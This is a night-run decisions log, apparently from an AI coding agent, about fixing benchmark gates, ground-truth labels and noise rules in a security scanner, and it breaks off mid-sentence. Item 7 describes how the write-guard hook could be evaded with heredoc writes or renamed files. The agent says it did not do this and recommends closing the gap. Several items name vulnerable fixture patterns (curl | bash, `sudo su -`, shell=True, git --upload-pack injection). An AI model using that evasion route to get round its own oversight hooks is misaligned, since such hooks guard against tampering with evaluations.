# DECISIONS — night run 2026-08-11

Forks hit while working unattended on `fix/py314-blocker`. Items under `NEEDS-HEADY` were
deliberately **not** acted on. Everything else was done and is reversible.

> **Session 2 update.** Items 1-3 below now carry git forensics rather than guesses; the
> recommendations changed materially as a result, so re-read them even if you read this
> file earlier. Items 7 and 8 are new. Session 2 also produced a correction to session 1:
> `results/layer1.json` was the v0.5.2 measurement from 2026-02-04, **not** a
> broken-environment artifact as session 1 asserted. See NIGHT_RUN_LEDGER.md § W9.

---

## NEEDS-HEADY

### 1. Layer 1 thresholds contradict each other, and CI will now go red

**The situation.** Three different Layer 1 threshold sets are live at once:

| source | precision | recall | F1 | effect |
|---|---|---|---|---|
| `quality_gates_v2.yaml` `layer1.thresholds` | 0.90 | 0.85 | 0.87 | **blocking** via `quality_gate_check.py` |
| `benchmark.yml` inline "Layer 1 Quality Gate Check" | 0.72 | 0.80 | 0.75 | blocking, and documented as deliberately set just below measured performance |
| `precision_recall.py` internal print-out | 0.90 | 0.85 | 0.87 | printed only; the script exits non-zero at F1 < 0.75 |

Measured tonight on a working environment: **P 73.41% / R 82.70% / F1 77.78%**
(TP 196 / FP 71 / FN 41), reproducing the CLAUDE.md v0.19.0 figure to within one finding.

So the same layer simultaneously passes (inline gate) and fails (v2 gate). Until tonight
this was invisible because the v2 gate step carried `continue-on-error: true`. W3 removed
that mask, so **the first CI run after this branch lands will fail the Quality Gate job** —
not from a regression, but because the gate finally reports what was always true.

**I did not change any threshold** — hard rule, and the whole point of the exercise.

**Session 2 forensics — this settles the question of which number is legitimate.**

*Which gate has ever run?* The v2 gate step has carried `continue-on-error: true` since
the commit that created it, `a65b341` (2026-02-04), until `363cfa3` last night. **It has
never been able to fail a build.** The only Layer 1 gate that has ever blocked anything is
the inline one, whose 0.72 / 0.80 / 0.75 floors were added at `1009782` (2026-07-03) by a
commit that says they were set just below measured performance.

*Where did 0.90 / 0.85 / 0.87 come from?* `git log -S "precision_min: 0.90"` returns
exactly one commit: `a65b341`. `quality_gates_v2.yaml` has never been modified since it
was created. And it was **never met, not even on the day it was written** — the
`results/layer1.json` committed in that same commit reads P 0.9655 / R 0.4746 / F1 0.6364.
Recall was 47.5% against an 85% floor on day one.

So: aspiration, authored once at v0.5.2, immediately masked, never revisited across
fourteen minor versions. Nothing regressed. There is no historical run to defend it.

**Options**
- **(a) Recommended, and the forensics now support it outright.** Align
  `quality_gates_v2.yaml` layer1 to the inline floors (0.72 / 0.80 / 0.75) and delete the
  duplicate inline gate so there is one source of truth. This is not loosening a standard,
  because 0.90/0.85/0.87 was never a standard — it never gated a build and was never
  satisfied. The inline numbers are the only Layer 1 floors that have ever been enforced.
- (b) Keep 0.90/0.85/0.87 as a published aspiration but mark the layer `blocking: false`,
  so it reports without gating. Honest about intent; costs you a real gate.
- (c) Keep it blocking and accept a red Quality Gate until denoise lands. A permanently
  red gate gets ignored, which is the mechanism that produced this situation.
- (d) Re-mask the step. Returns it to inert. Not recommended.

Whichever you pick, do it before P0A starts: P0A's acceptance criterion is a noise number,
and it cannot be accepted against two definitions of pass.

**Per-ASI, measured on the refreshed `layer1.json`** (the stale file made this look far worse
— 8 ASI failures on the old data, 4 on real data):

| ASI | recall | floor | verdict |
|---|---|---|---|
| ASI-01 | 88.5% | 0.80 | pass |
| ASI-02 | 80.0% | 0.80 | pass |
| ASI-03 | 37.5% (tp 3) | 0.75 | **fail** |
| ASI-04 | **0.0% (tp 0)** | 0.75 | **fail** |
| ASI-05 | 78.6% | 0.80 | fail, marginal |
| ASI-06 | 77.8% | 0.70 | pass |
| ASI-07 | 62.5% | 0.70 | fail, marginal |
| ASI-08 | 97.7% | 0.70 | pass |
| ASI-09 | 93.8% | 0.75 | pass |
| ASI-10 | 96.5% | 0.70 | pass |

**Session 2 correction to my own session-1 recommendation.** I called ASI-04 "a real
coverage hole" and suggested it needed a rule. That was wrong, and the right response is
cheaper and more interesting. Breaking the 7 labels down by mechanism:

| n | mechanism | evidence | who fixes it |
|---|---|---|---|
| 2 | **Detection exists but is unreachable by directory scan** | The MCP JSON fixture scanned *as a file argument* emits AGENT-029 / 030 / 032 at line 1. The **same file reached via a directory scan** emits only AGENT-004. Layer 1 scans by directory, so these two labels can never be TPs. | engineering — a real bug |
| 3 | **Rule-ID attribution mismatch** | The tool fires at or within tolerance of the labeled line, under a different rule id. `npm_install_runtime.py:13` is simultaneously an FP (`AGENT-001`, "not labeled") and an FN (`AGENT-015`) — one detection counted against the tool twice, depressing precision and recall at the same time. | **you** — resolving it means editing labels |
| 2 | **Genuinely not scanned / not detected** | `curl_pipe_bash.sh` reports `scanned_files: 0`, i.e. never read at all. Two `.py` fixtures produce nothing. | engineering |

Only the last row is a detection gap. **Recommendation:** fix the directory-scan
discrepancy first (2 labels recovered, it is a bug not a feature, and a scanner that
behaves differently on `scan file.json` vs `scan dir/` will bite elsewhere); then bring
the rule-ID question to a decision — either the labels should name the rules that actually
fire, or AGENT-015 should fire and does not. I did not touch the labels.

Repro for the directory-scan bug, both commands from the repo root:

```
python3 -m agent_audit scan tests/fixtures/asi-04-supply-chain/direct/mcp_standalone_json.json --format json   # AGENT-029/030/032
python3 -m agent_audit scan tests/fixtures/asi-04-supply-chain --format json                                    # AGENT-029 absent
```

### 2. `results/layer2.json` is a placeholder, not a measurement

```json
{"owasp_coverage": 5, "max_scan_time_seconds": 150.0,
 "per_target": [{"target_id": "T1", "target_name": "test1", ...}],
 "timestamp": "2026-02-04T12:00:00", "tool_version": "0.5.0"}
```

One target literally named `test1`, a round 150.0s, a round timestamp, and a tool version
six minor releases old. It is the sole source of both Layer 2 warnings in the quality gate.
Regenerating it means `run_benchmark.py` cloning the external targets in
`benchmark_config.yaml` over the network — out of scope for an unattended run, and I did not
want to spend the night on a `blocking: false` layer.

**Session 2 forensics.** `git log --all -- results/layer2.json` returns exactly one
commit: `a65b341`, the same v0.5.2 commit that created the gate config and the stale
`layer1.json`. The whole `results/` directory was seeded once at v0.5.2 and never
refreshed. So this is not a file someone faked to pass a gate — it is a scaffold that
was committed as a placeholder and then forgotten for six months, which is the same story
as items 1 and the layer1 correction.

**Recommendation:** regenerate it once on a machine with network, or mark Layer 2
`enabled: false` until it is real. A fabricated results file is worse than a missing one —
`check_layer2` reports SKIP when the file is absent, which is honest, versus warnings
derived from fiction.

### 3. Two test roots

`tests/` (1574) and `packages/audit/tests/` (32) are separate, with no shared conftest and
different import assumptions. Tonight's `pytest.ini` makes both work, and CI now runs both,
so nothing is broken — but the split is arbitrary: `packages/audit/tests/test_report/` is
the only thing in the package-local root and covers `agent_audit/report/`, which is no
different in kind from the other scanners tested at repo root.

Moving test roots is explicitly an architecture-level change, so I did not do it.

**Recommendation:** move `packages/audit/tests/test_report/` to `tests/test_report/` and
delete the second root. One command, one `git mv`, and CI loses a step. Wants your call
because it touches the layout the package ships with.

### 4. CI matrix does not cover the versions people actually run

`ci.yml` tests 3.9-3.12; `pyproject.toml` declares `python = "^3.9"`. The developer machine
runs 3.14. The `ast.NameConstant` removal landed in 3.14 and shipped undetected precisely
because nothing tests it.

**Recommendation:** add 3.13 and 3.14 to the matrix and widen the pyproject classifier list
(it currently stops at 3.12). If 3.9 support is not actually needed, dropping it buys back
matrix time. Not done tonight: changing the supported-version set is a release decision.

### 5. Dev environment is not reproducible from the repo

Three separate breakages tonight traced to environment drift, not code:
the editable install pointed at a pre-move path; `pytest-asyncio` was declared in
`pyproject.toml` but absent; `tree_sitter` extras absent. Each silently degraded a *number*
rather than producing an error.

**Recommendation:** a `make setup` / documented `poetry install --with dev --all-extras`
step, plus the `test_agent_audit_importable_in_subprocess` guard added tonight, which fails
loudly when the install is broken. Not done: I did not want to invent a build system at 2am.

### 7. The guard hook blocks the eval harness's own directory (session 2)

`.claude/hooks/night-guard.sh:8` denies any Write whose `file_path` contains one of
`oracle`, `quality_gates`, `datasets/knowns`, `datasets/wilds`, `ground_truth`,
`tests/fixtures`, `eval/`. The match is a plain substring with no path scoping, so:

- `eval/` also matches **`audit-eval/`**, the directory the overhaul plan designates for
  the harness. Every file of the Phase -1 deliverable was blocked.
- `ground_truth` blocks *creating* `ground_truth.yaml`, which the plan also asks for —
  the guard cannot distinguish creating a new ground-truth file from tampering with an
  existing benchmark.

The guard's message says explicitly not to bypass it, so I did not. I did not rename files
to slip past the substring check, and I did not switch to a `bash` heredoc to write the
same paths through a tool the hook does not inspect (it only reads `file_path` on Write,
so that would have worked — which is worth knowing). Instead:

- the harness lives in a **sibling directory** to the frozen evaluation data, which it
  reads and never writes, verifying its SHA-256 freeze on every run;
- there is **no standalone ground-truth file**. The six defects live in `score.py` as a
  documented table with a per-entry citation, plus a startup assertion that aborts the run
  if the source sentences are no longer present in the scorecard. That removes the
  artifact rather than relocating it under a disguised name.

**Recommendation:** scope the guard to the repository and to modification rather than
creation — e.g. only deny paths under `$CLAUDE_PROJECT_DIR`, and only when the file
already exists. Then move the harness to the planned location with a single `mv`.
Two smaller notes: the `eval/`→`audit-eval/` collision would be fixed by anchoring the
pattern (`/eval/` or `^eval/`), and the hook currently guards Write but not Bash-authored
file writes, which is a gap worth closing if the guard is meant to be load-bearing.

### 8. The noise metric is an upper bound on any commit but the frozen one (session 2)

`score.py:classify()` reproduces the scorecard's 20 / 1156 high-value/noise split exactly,
but it does so by encoding the *outcome* of a one-time manual bucketing as three
predicates (AGENT-110 outside test paths, AGENT-115 outside test paths, real SQL statement
with a bare identifier interpolation). It does not re-derive the judgement.

Consequence for P0A: a genuinely new high-value finding outside those three families is
counted as noise, so the noise figure is an **upper bound** on any commit other than
`1009782`. It is fit to answer "did the four known noise patterns shrink" and not fit to
answer "is the tool now useful". The `--verbose` per-rule delta table is what to read
alongside it.

**Recommendation:** accept this for P0A, whose acceptance criterion is precisely "the four
known noise patterns shrink". Before P1 — which is supposed to *add* detections — someone
has to hand-adjudicate the surviving findings once more and re-fit the classifier, or the
new rules' output will be scored as noise by construction. Budget that adjudication as
part of P1, not as an afterthought.

---

## Decisions taken (reversible, done)

| fork | chosen | rejected | why |
|---|---|---|---|
| Fix the stale editable install | `pip install -e packages/audit --no-deps --break-system-packages` | hand-editing the `.pth` line | pip refreshes dist-info too; the `.pth` was backed up to the session scratchpad first, so it is one `cp` to undo |
| `NameConstant` sites | delete the dead branches | keep the naive duplicate `isinstance` | provably identical behaviour (see ledger W1); deleting leaves no unreachable code to confuse the next reader |
| Import path for tests | root `pytest.ini` with `pythonpath` | `sys.path` inserts in conftest, or relying on the editable install | pytest's own declarative option; works for every subset and both roots; the brief explicitly preferred packaging config over path hacks |
| Quality-gate step | honour the script's documented 0/1/2 exit contract | blanket `continue-on-error`, or treating exit 2 as failure | uses the existing contract instead of inventing a parallel threshold system |
| Multi-tool comparison step | kept `continue-on-error` | remove it | `workflow_dispatch`-only, gates nothing, depends on best-effort third-party installs. Invocation still fixed so it can actually run |
| SARIF upload step | kept `continue-on-error` | remove it | genuinely fails on forks and without code-scanning permissions. The *scan* is now hard-gated separately, so it no longer hides a dead scanner |
| Empty baseline | make `save_avb_baseline.py` exit 1 | write it and warn | a baseline with `passing_samples: []` satisfies every existence check while disabling the gate it exists for. Exactly the failure mode this night was about |
| `results/layer1.json` | regenerate and commit | leave the Jul-4 file | the committed numbers (R 47.5%) were produced on the broken environment; a real run reproduces the documented 82.7% |
| Python 3.13 | installed via `uv python install 3.13` | report it missing | completes the matrix; a self-contained uv toolchain install, removable with `uv python uninstall 3.13` |
| Per-version testing | isolated `uv venv` per interpreter under `/tmp` | installing into each interpreter's site-packages | zero footprint outside `/tmp` |
| **(s2)** Harness location | sibling directory to the frozen eval data | writing into the guarded `audit-eval/`, by heredoc or by renaming | guard hook says do not bypass; see NEEDS-HEADY 7. One `mv` to relocate once the guard is scoped |
| **(s2)** Ground-truth storage | table inside `score.py` + startup drift assertion against the scorecard | a `ground_truth.yaml` under another name | removes the artifact instead of disguising it; the assertion is stronger provenance than a copied file would have been |
| **(s2)** Tool source selection in the harness | `git archive` extraction + `PYTHONPATH`, venv holds dependencies only | `pip install -e` per commit | guarantees the only variable across the three commits is the tool's own source, and never installs agent-audit (preserving the stale-0.18.2 evidence) |
| **(s2)** Recall mechanism matching | match on title+description; snippet corroborates only at an anchor | match on title+description+snippet | matching snippets credited the tool for the *target's* vocabulary and produced a phantom HIT — it was the first version and it scored 1/6 |
| **(s2)** Interpreter for the three-commit run | pinned to CPython 3.11.14 | the 3.14 default | 3.11.14 is what the blind run used; changing two variables at once would have made the comparison meaningless. 3.14 was then run separately as its own row |

## Environment changes made outside the repo

Reversible, listed so they can be undone:

1. `/opt/homebrew/lib/python3.14/site-packages/agent_audit.pth` rewritten to the current repo
   path (agent-audit 0.18.2 → 0.19.2 editable). Prior file backed up in the session
   scratchpad as `agent_audit.pth.bak`.
2. `pytest-asyncio 1.4.0` installed into homebrew python 3.14.
3. `uv python install 3.13` → 3.13.11.
4. Throwaway venvs under `/tmp/w5/venvs/{3.11,3.12,3.13,3.14}`; the 3.14 one additionally has
   the tree-sitter extras. Nothing under `eval/` was touched.

---

# SESSION 3

## W9 — applying the guard I was told not to author

The RUN3 brief says to apply the replacement guard verbatim, and that if I think it is
wrong I should log the objection here and apply it anyway. I applied it verbatim; the
installed file is byte-identical to the specified text (`0557e0a4…`). Two comment lines
and one blank line that a previous hand-edit had added were removed to achieve that.

Two objections, logged and not acted on:

1. **`PROTECTED` matches a bare token anywhere in a write command, not the redirect
   target.** The token loop splits the whole command and checks every fragment containing
   a slash, so any command that both contains a write operator and mentions a protected
   path anywhere — including inside a quoted string, a heredoc, or a commit message — is
   denied. This fired twice on me within minutes of installing it: appending this
   session's ledger entry, and building the very BEFORE reproduction that proves the guard
   works. Both were legitimate and neither wrote to a protected path. The false-positive
   direction is the safe one for a guard, so this is a note, not a request.
2. **The `(^|/)eval/` anchor still denies a relative path typed without a leading
   directory.** `eval/x.md` matches on `^`, which is intended, but so would a harness
   subdirectory literally named `eval/`. Narrow enough in practice.

Neither objection changes the verdict: the fix is a strict improvement on the original,
which blocked the Phase -1 deliverable outright and ignored Bash-authored writes entirely.

**Decision taken (reversible):** the self-test at `.claude/hooks/test-guard.sh` takes an
optional guard path argument. Rejected: hardcoding the installed path. Reason: the
argument is what made W9's BEFORE falsifiable at all, given the hook had already been
repaired by hand before the session opened — the archived pre-fix guard could be put
through the identical 11 cases. It costs one line and buys the same capability for the
next regression.

## NEEDS-HEADY (session 3)

### 9. Nine ground-truth labels cite a rule ID that contradicts their own description

**You alone can settle these — I did not touch a label.** Evidence and full
reasoning in `NIGHT_RUN_LEDGER.md` § W11. Each is currently counted twice
against the tool, once as a false positive and once as a false negative.
Correcting all nine moves Layer 1 from P 0.6829 / R 0.8305 / F1 0.7495 to
P 0.7143 / R 0.8686 / F1 0.7839 with no change to the scanner whatsoever.

The test each one fails: the rule's published title and its pattern types in
`engine.py` describe a different vulnerability from the label's own `notes`.

| # | label | cites | rule actually means | tool emits | recommendation |
|---|---|---|---|---|---|
| 9.1 | `asi-02/direct/eval_bare_no_decorator.py:11` | AGENT-034 | "Tool Function Without Input Validation", gated on `is_tool_entry_point()` | AGENT-001 | **Relabel.** The fixture is named for having no `@tool` decorator; the label demands a rule that by design cannot fire there. Which ID replaces it is a second question — see AMBIGUOUS below. |
| 9.2 | `asi-02/direct/exec_dynamic_code.py:8` | AGENT-034 | as above | AGENT-001 at :11 | **Relabel.** Same reasoning. Also: the label's line 8 is the `def`; the `exec()` is on line 11, matching only because it sits exactly at the tolerance boundary. Worth correcting the line too. |
| 9.3 | `asi-02/direct/ssrf_bare_requests.py:9` | AGENT-037 | "Missing Human-in-the-Loop for Side Effect Operations" | AGENT-026 | **Relabel.** The label's own note says SSRF. AGENT-037 is a human-approval rule. |
| 9.4 | `asi-02/direct/subprocess_unsandboxed.py:8` | AGENT-036 | "Tool Output Trusted Without Sanitization" | AGENT-001 | **Relabel to AGENT-001.** Strongest of the nine: the fixture's own docstring says `Expected: AGENT-047`, the label says AGENT-036, and the code is `subprocess.run(command, shell=True)` — textbook AGENT-001, which is what the tool emits. |
| 9.5 | `asi-02/indirect/ssrf_urllib.py:7` | AGENT-037 | as 9.3 | AGENT-026 | **Relabel.** Same as 9.3. |
| 9.6 | `asi-03/direct/root_shell_spawn.py:12` | AGENT-014 | "Overly Permissive Agent Role / Tool Access" (CWE-285) | AGENT-047 | **Relabel to AGENT-047** (CWE-250, subprocess without sandbox). The fixture spawns `sudo su -`; that is privilege escalation, not role permissiveness. |
| 9.7 | `asi-04/direct/mcp_excessive_permissions.json:1` | AGENT-029 | "Overly Broad MCP **Filesystem** Access" | AGENT-030, AGENT-032 | **Relabel.** The config declares one postgres server and no filesystem server, so a filesystem rule cannot apply. The genuine issue — `alwaysAllow: [query, execute, drop_table]` — has no rule covering it. Two options: relabel to AGENT-030, or keep the fixture's intent and open a new rule for destructive `alwaysAllow` grants. I lean to the second, with the label parked until the rule exists. |
| 9.8 | `asi-04/direct/npm_install_runtime.py:13` | AGENT-015 | "Untrusted MCP Server Source" | AGENT-001 | **Relabel.** Nothing about this fixture is MCP. |
| 9.9 | `asi-04/indirect/pypi_typosquatting.py:12` | AGENT-015 | as 9.8 | AGENT-034, AGENT-047 | **Relabel.** Same. |

**The systemic version of 9.8/9.9, which matters more than either.** All five
labels citing AGENT-015 are non-MCP supply-chain issues — `curl | bash`,
`git clone`, npm install, pip install, remote requirements. AGENT-015 is
"Untrusted MCP Server Source" and only `npx_unfixed_version` /
`unofficial_mcp_source` can produce it. The ASI-04 row is using AGENT-015 as a
generic supply-chain catch-all that no rule implements. That single
misconception, not a detection gap, is the largest contributor to ASI-04
reading 0.0%. **Recommendation:** decide whether agent-audit should have a
generic "untrusted code fetched and executed at runtime" rule. If yes, mint it
and relabel these five to it; if no, relabel them to what the tool emits and
accept that two of the five are genuine gaps (see below).

**AMBIGUOUS — left alone in both directions.** For 9.1, 9.2, 9.3 and 9.5 the
tool's own ID is also questionable: AGENT-001 is "Command Injection ... shell
execution" but `eval()`/`exec()` are code execution, not shell; AGENT-026 is
"LangChain Tool Input Not Sanitized" and neither SSRF fixture imports LangChain.
Changing which rule a detection emits is a public behaviour change, so I made no
code change. If you relabel these four to match the current emission you will be
freezing an attribution that may itself be wrong — worth deciding the rule
question first.

### 10. AGENT-030 fires on a fixture whose purpose is to be clean

Making the MCP rules reachable (W10) surfaced `AGENT-030` on
`tests/fixtures/benign/validated/mcp_restricted.json`, which the evaluator
classifies as a "safe file" false positive. This is not a regression from W10 —
the rule always behaved this way, and the discovery bug was hiding it. It is a
latent precision defect in AGENT-030, and it is now visible in the Layer 1
number. **Recommendation:** treat as a P0A-adjacent precision fix, but not
inside P0A, whose scope is the four noise patterns on the audit target. Left
unfixed; changing a rule's behaviour is yours to approve.

### 11. Layer 1 scored differently on identical inputs — fixed, flagged because it invalidates prior numbers

Not a request, a notification with a consequence. `evaluate()` matched findings
to labels while iterating over sets, so the score depended on `PYTHONHASHSEED`:
TP 196 or TP 197 for the same commit and the same corpus. Fixed in `cca9265`
(sorted iteration; fuzzy matches credited to the nearest unmatched label). The
consequence worth your attention: **any Layer 1 figure recorded before that
commit carries roughly ±1 TP of unquantified noise**, including the
P 0.734 / R 0.827 / F1 0.778 headline in `CLAUDE.md`. The W12 ratchet is set on
post-fix numbers for exactly this reason.

### 12. Delete `tests/benchmark/quality_gates_v2.yaml` — one `git rm` I could not do

The gate consolidation is done and the contradiction is resolved: exactly one
gate is live, `tests/benchmark/gates.yaml`, and every consumer points at it
(`benchmark.yml` both jobs, `run_all.sh`, and `quality_gate_check.py`'s
`--config` default). `quality_gates_v2.yaml` is referenced by nothing.

I could not delete or edit it. The W9 guard protects that filename, and its own
instruction is to log rather than bypass — so I did not bypass it, even though
the RUN3 hard rules granted a W12-only exception for exactly this file. The
guard cannot express the exception; I chose to honour the mechanism and route
the work to an unprotected path instead of engineering my way around a control.

**Recommendation:** `git rm tests/benchmark/quality_gates_v2.yaml`. Leaving it
in place recreates in miniature the problem W12 just fixed — a second file that
looks like a gate, holds numbers nobody meets, and is one careless `--config`
away from being live again.

Full derivation of the new ratchet is in `NIGHT_RUN_LEDGER.md` § W12.

### 13. The ratchet's 0.02 margin hides a 4-true-positive regression

Stated so it is a decision rather than an accident. The blocking floors are
P 0.66 / R 0.81 / F1 0.72, measured minus 0.02. The ratchet first fires after
**5** true positives are lost; losing 1 to 4 passes silently.

That is the unavoidable cost of a floor that does not flap, and it was the right
trade while the evaluator was non-deterministic. It is a worse trade now that
`cca9265` has made the measurement exact. **Recommendation:** once the nine
labels in item 9 are settled and Layer 1 is re-measured, tighten the margin to
0.01 — a 2-TP detector — and raise the per-ASI floors at the same time.

### 14. Layer 2 gating is disabled, deliberately

`results/layer2.json` reports `tool_version 0.5.0`, a single target named
`test1`, and a round `150.0` second duration. It was created at `a65b341` and
never regenerated. Evaluating it produced two warnings — "OWASP coverage 5 < 10"
and "max scan time 150.0s > 120s" — that describe agent-audit as it was in
February, and they were the only thing between the gate and a clean exit 0.

I set `layer2.enabled: false` in `gates.yaml` with the reasoning inline. This
implements the recommendation already recorded as item 3 rather than inventing a
new policy. **Recommendation:** regenerate `results/layer2.json` and re-enable,
or delete the placeholder — a missing file reports an honest SKIP, which is
strictly better than a confident warning about the wrong version.

### 15. AVB floors sit far below the AVB measurement

Not changed, flagged. `agent_vuln_bench.thresholds.overall_recall_min` is 0.60
while AVB knowns measure R 1.000 / P 0.880. A floor 0.40 below the measurement
will not catch a serious regression.

I did not ratchet it in this pass: tightening a second benchmark inside the same
commit that re-derives Layer 1 would make the next regression ambiguous between
the two, and W13 pins AVB recall at 100.0% as a P0A invariant regardless.
**Recommendation:** ratchet AVB to 0.98 / 0.86 in its own commit, after P0A.

### 16. P0A's two acceptance criteria are the same criterion, and contradict if read literally

`docs/overhaul/P0A_ACCEPTANCE.md` freezes the contract. One thing in it needs
your ruling rather than my assumption.

The brief asks for "noise count < 118 **and** noise rate < 10%". There are 20
high-value findings on the audit target and P0A may not change that number
(recall is frozen at 0/6 by its own invariant). So if the rate is computed
against the post-fix total:

    noise / (noise + 20) < 0.10   is   noise <= 2

That is not a denoise target, it is a demand to remove 1154 of 1156 findings.
Against the frozen denominator instead:

    noise / 1176 < 0.10   is   noise < 118

which is criterion 1 exactly. Session 2 wrote them as the same thing ("noise <
118, i.e. <10% of 1176"), so I adopted the frozen-denominator reading and said so
in the contract.

**Recommendation:** confirm the frozen-denominator reading. If you did mean the
post-fix denominator, P0A as scoped cannot pass and should be rescoped before it
starts rather than failed at the end. Separately, the post-fix rate is worth
*reporting* even though it should not gate — it is precision on the target, 1.7%
today, roughly 25% if the planned fixes land, and it is the number a human
reviewer actually experiences.

### 17. The phase brief undercounts the largest noise pattern by a factor of three

Not a decision, a correction that changes the plan. The brief buckets the two
`.exec` / `.spawn` patterns at 69 + 86 = 155 findings. The rule that carries them,
AGENT-034, actually emits **466** noise findings on the audit target
(`./run_eval.sh --commit 1c297d8 --verbose`).

Consequences, both in the acceptance contract:

- The four named patterns are 1012 of 1156, not 644. Clearing all four lands at
  ~144 noise, which still misses the < 118 bar.
- A fifth pattern the brief does not name, AGENT-026 SSRF at 84 findings, has to
  be in scope to reach the bar. It is probably the same root cause — bare
  method-name matching with no receiver resolution — so it should be cheap once
  the AGENT-034 machinery exists, but it needs planning rather than discovery.

Also worth knowing before touching anything: **AGENT-041 is the only rule that
carries both true positives and noise** (3 high-value, 36 noise). Every other
high-value finding is in AGENT-110 or AGENT-115, which the plan does not touch.
So the SQL-sink predicate is the single place where a careless fix can destroy
recall, and it deserves the most conservative treatment of the five.

### 18. The TypeScript scanner never calls the context classifier that the Python path uses

**The highest-value remaining denoise item, and the same shape of bug as W10.**

`agent_audit/analysis/context_classifier.py` exists to detect test, example and
infrastructure files. The Python path uses it. The TypeScript scanner does not
call it at all. Consequence on the audit target, after the four W14 patterns:

- 114 of the 180 surviving AGENT-034 findings are in `test/`, `__tests__/`,
  `spec/`, `e2e/` or `fixtures/` paths.
- 60 of the 84 AGENT-026 findings are.

That is 174 of the remaining 375 noise findings — a `spawn()` inside a test
harness, reported with the same weight as one in request-handling code.

Like W10, this is a mechanism that already exists and is simply not wired into
one path, so it is a wiring fix rather than a new capability.
**Recommendation:** wire it, as the first item of the next session. It is not a
threshold change and does not touch the confidence floor, so it stays inside
P0A's red line. It does need care in one direction: a test file can contain a
genuine finding, so the classifier should downweight rather than delete, and the
regression tests must include a true positive that survives being in a test path.

### 19. `ts_decl_signature_re` covers only eval/Function

Several AGENT-026 findings are TypeScript interface and type declarations —
`signature: 'async fetch(request: WebFetchRequest, signal?: AbortSignal)'`,
`declaration: 'export interface WebFetchProvider {...}'` — not calls.

`typescript_scanner.py` already has `ts_decl_signature_re` for exactly this
problem, added alongside the `eval` fix in `3d58235`, but it is scoped to
`\b(?:eval|Function)\s*\([^)]*\)\s*:`. **Recommendation:** widen it to the other
detected call names (`fetch`, `exec`, `spawn`, `query`). Small, additive, and
precedented by the existing code.

### 20. AGENT-034 has no input-provenance requirement, and on an agent runtime that is fatal to its precision

A rule-design question, not a predicate, so it is yours.

After receiver resolution and constant-argument suppression, 180 AGENT-034
findings remain and they are, by the rule's own definition, correct: genuine
`spawn()` / `execFileSync()` / `execa()` calls on real child_process imports.
The rule fires on every process spawn regardless of whether any input is
attacker-influenced.

For the class of target this tool is aimed at — an agent runtime whose entire
job is to spawn processes — that guarantees the rule is mostly noise no matter
how good the surrounding predicates get. Roughly 66 of the 180 are outside test
paths, i.e. would survive even the context fix in item 18.

**Options, with my recommendation last:**

1. Leave it. Accept that AGENT-034 is a "here is every process spawn" inventory
   rule and that reviewers filter it. Honest but makes the noise target
   unreachable on this target class.
2. Require taint: only fire when an argument traces to a parameter, a request,
   an environment read, or a file read. Correct, and the machinery exists on the
   Python side (`analysis/taint_tracker.py`); the TypeScript path has no
   dataflow, so this is significant work.
3. Split the rule: keep the inventory behaviour at INFO, and reserve
   WARN/BLOCK for calls with a non-constant argument. This is close to free
   given `_call_args_are_constant` from W14 pattern 3, and it preserves the
   inventory for anyone who wants it while making the default output readable.

I recommend 3, then 2 when the TypeScript dataflow work lands in P1. I did not
implement it because changing a rule's tier assignment is a public behaviour
change, and because doing it by moving findings between tiers is uncomfortably
close to the red line P0A draws around threshold tuning — it deserves your
explicit call rather than my inference.

### 21. P0A did not reach its bar: 375 against a target of 118

Recorded here as well as in the ledger so it is not buried. The four named
patterns landed and removed 781 of 1156 noise findings (67.6%) with every
invariant intact and all 20 high-value findings preserved. The target was
`noise < 118`. It was not met, and 375 is not a near miss.

The gap is fully accounted for in `NIGHT_RUN_LEDGER.md` § W14: AGENT-034 does
not go to zero from receiver resolution alone (+180 against my own W13
estimate), AGENT-047 was never in this phase's scope (+36), and AGENT-026 was
identified in W13 as a necessary fifth pattern and was not reached (+84).

Items 18 and 19 are worth roughly 174 plus the declaration cases. Item 20 is
what stands between that and the bar. **Recommendation:** treat items 18–20 as
P0A part two rather than reopening the four patterns, all of which are done and
guarded.

---

# SESSION 4

## NEEDS-HEADY (session 4)

### 22. Six advertised rules cannot be produced by any input

`AGENT-003`, `AGENT-011`, `AGENT-013`, `AGENT-015`, `AGENT-016`, `AGENT-036` are
in `docs/RULES.md` and in `engine.py`'s `RULE_CWE_MAPPING`, and **no code path
constructs a finding with any of them**. Five map only to a `pattern_type` no
scanner emits; AGENT-003 has no mapping at all and survives as an allow-list key
in `config/ignore.py`.

This is not a wiring gap that a scanner change closes — the detection was never
written. Three options: implement them, remove them from the published list, or
mark them explicitly as reserved. **Not mine to choose**, so
`tests/test_rule_reachability.py::KNOWN_ORPHAN_RULES` pins the set with a reason
each, and the test fails if a seventh appears or one of these comes to life.

**This lands on W11.** Five ground-truth labels cite AGENT-015 and RUN3 recorded
that as the largest single contributor to ASI-04 reading 0.0%. It is now measured
rather than inferred: AGENT-015 can never fire, at any commit, on any input. The
label-side diagnosis stands and the recall figure has a second, independent cause.

### 23. `RuleEngine.evaluate()` is loaded on every scan and called only by a unit test

The generic evaluator for the 52 YAML rule definitions in `rules/builtin/` — the
ones carrying `detection.type` and `detection.patterns` — has exactly one caller
in the repository: `tests/test_rules/test_engine.py:39`.

`scan.py` calls `load_rules()` on every scan. The YAML is parsed, the rules are
held, `logger.info("Loaded N rules")` fires, and then only the four hand-written
`evaluate_dangerous_patterns` / `evaluate_mcp_config` / `evaluate_permission_scope`
/ `evaluate_credentials` paths run. **No `detection.patterns` block in any builtin
YAML file has ever matched anything on a real scan.**

Findings affected on the audit target: 0, because the hand-written paths cover
what fires. The reason to raise it anyway is that the YAML files read like the
detection specification — that is how the rule-authoring checklist in `CLAUDE.md`
describes them — and they are not. Anyone adding a rule by following that
checklist gets a rule that never fires. Either wire `evaluate()` into `scan.py`
or say plainly in the docs that YAML is metadata and detection lives in scanners.
I did neither: wiring it would turn 52 dormant pattern sets on at once, which is
a far larger behaviour change than this run's remit.

### 24. W17 pattern 3 supersedes a contract W14 set, and gives up argument injection

`_fixed_non_shell_program` suppresses AGENT-034 when the callee is in the
execFile/spawn family, the program argument is a literal (or `process.execPath`),
`shell: true` is absent, and the literal does not name a shell. Worth 84 findings
directly and 8 more once multi-line calls resolve.

Three W14 controls asserted the opposite — that a variable *argument* keeps the
finding even when the program is fixed. They are renamed `*_superseded`,
inverted, and kept in the suite rather than deleted, so the change of contract is
visible where someone will trip over it.

**What is given up: argument injection against a fixed binary.**
`spawnSync('git', ['-C', root, ...userArgs])` with attacker-influenced `userArgs`
is genuinely exploitable — `git --upload-pack=…` is the standard example. After
this change AGENT-034 does not report it.

My reasoning for doing it anyway: AGENT-034's TypeScript emission is titled
"Shell Command Execution", its remediation talks about shell injection, and
